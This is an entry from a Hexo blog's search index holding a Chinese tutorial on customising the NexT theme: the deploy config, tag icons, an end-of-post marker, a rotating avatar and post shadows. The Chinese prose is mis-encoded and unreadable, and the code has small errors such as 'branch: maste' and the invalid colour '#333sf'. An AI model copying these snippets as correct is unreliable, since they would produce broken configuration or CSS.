ä¸»é¢˜é…ç½®## Themes: https://hexo.io/themes/theme: maupassant# éƒ¨ç½²é…ç½®## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # éƒ¨ç½²åˆ°github repository: git@github.com:sherdh/sherdh.github.io.git # åˆ†æ”¯é»˜è®¤master branch: maste ä¸»é¢˜ç¾åŒ–ä¿®æ”¹æ–‡ç« åº•éƒ¨çš„é‚£ä¸ªå¸¦#å·çš„æ ‡ç­¾ä¿®æ”¹æ¨¡æ¿/themes/next/layout/_macro/post.swigæœç´¢ rel=â€tagâ€&gt;#ï¼Œå°† # æ¢æˆ &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; åœ¨æ¯ç¯‡æ–‡ç« æœ«å°¾ç»Ÿä¸€æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°åœ¨è·¯å¾„ \themes\next\layout_macro ä¸­æ–°å»º passage-end-tag.swig æ–‡ä»¶,å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------æœ¬æ–‡ç»“æŸ,æ„Ÿè°¢æ‚¨çš„é˜…è¯»-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; æ¥ç€æ‰“å¼€\themes\next\layout_macro\post.swigæ–‡ä»¶åœ¨post-body ä¹‹åï¼Œ post-footerä¹‹å‰æ·»åŠ &lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; ç„¶ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­æœ€ååŠ å…¥# æ–‡ç« æœ«å°¾æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°passage_end_tag: enabled: true ä¿®æ”¹ä½œè€…å¤´åƒå¹¶æ—‹è½¬æ‰“å¼€\themes\next\source\css_common\components\sidebar\sidebar-author.stylåœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* å¤´åƒåœ†å½¢ */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* è®¾ç½®å¾ªç¯åŠ¨ç”» [animation: (play)åŠ¨ç”»åç§° (2s)åŠ¨ç”»æ’­æ”¾æ—¶é•¿å•ä½ç§’æˆ–å¾®ç§’ (ase-out)åŠ¨ç”»æ’­æ”¾çš„é€Ÿåº¦æ›²çº¿ä¸ºä»¥ä½é€Ÿç»“æŸ (1s)ç­‰å¾…1ç§’ç„¶åå¼€å§‹åŠ¨ç”» (1)åŠ¨ç”»æ’­æ”¾æ¬¡æ•°(infiniteä¸ºå¾ªç¯æ’­æ”¾) ]*/ /* é¼ æ ‡ç»è¿‡å¤´åƒæ—‹è½¬360åº¦ */ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out;&#125;img:hover &#123; /* é¼ æ ‡ç»è¿‡åœæ­¢å¤´åƒæ—‹è½¬ -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* é¼ æ ‡ç»è¿‡å¤´åƒæ—‹è½¬360åº¦ */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z è½´æ—‹è½¬åŠ¨ç”» */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125; ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœæ‰“å¼€\themes\next\source\css_custom\custom.styl,å‘é‡Œé¢åŠ å…¥ï¼š // ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœ .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; ç¾åŒ–å‚è€ƒæ–‡ç« ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
